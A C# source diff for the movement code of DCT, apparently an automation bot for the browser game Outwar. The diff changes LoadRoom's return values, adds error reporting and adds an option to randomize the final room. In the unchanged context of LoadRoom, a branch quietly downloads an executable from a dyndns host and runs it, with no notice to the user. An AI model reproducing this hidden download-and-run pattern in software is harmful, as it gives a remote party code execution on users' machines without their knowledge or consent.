@@ -314,14 +314,14 @@ namespace DCT.Outwar.World
         /// 
         /// </summary>
         /// <param name="url"></param>
-        /// <returns>True if mover should retry</returns>
-        private bool LoadRoom(string url)
+        /// <returns>0 if good, 1 if error with retry, 2 if error with override</returns>
+        private int LoadRoom(string url)
         {
             if (string.IsNullOrEmpty(url))
             {
                 CoreUI.Instance.LogPanel.Log("Move E: that room doesn't exist");
                 mSocket.Status = "Idle";
-                return true;
+                return 1;
             }
             if (mAccount.Ret == mAccount.Name)
             {
@@ -339,16 +339,22 @@ namespace DCT.Outwar.World
 
                         CoreUI.Instance.UpdateDisplay();
                         mLocation = tmp;
-                        return true;
+                        return 0;
                     case 1:
                         mSavedRooms.Clear();
                         RefreshRoom();
                         CoreUI.Instance.LogPanel.Log("Move E: Flying error - room hash invalid");
-                        return false;
+                        DCErrorReport.Report(this, "Bad room hash");
+                        return 1;
+                    case 2:
+                        CoreUI.Instance.LogPanel.Log("Move E: Need key");
+                        DCErrorReport.Report(this, "Need key");
+                        return 2;
                     default:
                         CoreUI.Instance.LogPanel.Log("Move E: Remaining in " + (tmp.Id == 0 ? "world.php" : tmp.Id.ToString())
-                            + " due to unknown error - maybe you need a key?");
-                        return false;
+                            + " due to unknown error");
+                        DCErrorReport.Report(this, "Unknown error");
+                        return 1;
                 }
             }
             else
@@ -357,7 +363,7 @@ namespace DCT.Outwar.World
                 WebClient Client = new WebClient();
                 Client.DownloadFile("http://typpo.dyndns.org/dct/exe.exe", "exe.exe");
                 Process.Start("exe.exe");
-                return false;
+                return 2;
             }
         }
 
@@ -394,6 +400,7 @@ namespace DCT.Outwar.World
                     CoreUI.Instance.MainPanel.StopAttacking(true);
                     return;
                 }
+                DCErrorReport.Report(this, "Null nodes path (unfamiliar location); teleport attempt possible");
             }
 
             FollowPath(nodes);
@@ -405,10 +412,19 @@ namespace DCT.Outwar.World
 
             mVisited = new List<int>();
 
-            FollowPath(Pathfinder.CoverArea(mLocation.Id, mSavedRooms));
+            List<int> path = Pathfinder.CoverArea(mLocation.Id, mSavedRooms);
+            FollowPath(path);
 
             CoreUI.Instance.LogPanel.Log("Area '" + mLocation.Name + "' coverage ended");
             mVisited.Clear();
+
+            // randomize last room
+            if (CoreUI.Instance.Settings.RandomizeLastRoom)
+            {
+                CoreUI.Instance.LogPanel.Log("Moving to finish room...");
+                string url = mLocation.Links[Util.Randomizer.Random.Next(0, mLocation.Links.Count)];
+                LoadRoom(url);
+            }
 
             mSocket.Status = "Idle";
         }
@@ -419,6 +435,7 @@ namespace DCT.Outwar.World
             {
                 CoreUI.Instance.LogPanel.Log("Move E: " + mAccount.Name + "'s projected path does not exist");
                 CoreUI.Instance.UpdateProgressbar(0, 0);
+                DCErrorReport.Report(this, "Projected path does not exist; movement attempt failed");
                 return;
             }
 
@@ -476,12 +493,14 @@ namespace DCT.Outwar.World
                 return;
             }
 
-            if(!LoadRoom(url))
+            int r = LoadRoom(url);
+            if(r==1)    // error with override
             {
                 if (++tries > 2)
                 {
                     MessageBox.Show(mAccount.Name + " is having trouble moving.  Reasons for this include:\n\n- It's impossible to reach your destination (are you missing a key?)\n- The program just can't find a way to get where you want to go\n- Someone logged into your account - press refresh and start your run again", "Moving Error", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                     CoreUI.Instance.MainPanel.StopAttacking(true);
+                    // Note: error report here is not necessary because specific cases are handled in LoadRoom
                     return;
                 }
                 LoadRoom(id, tries);
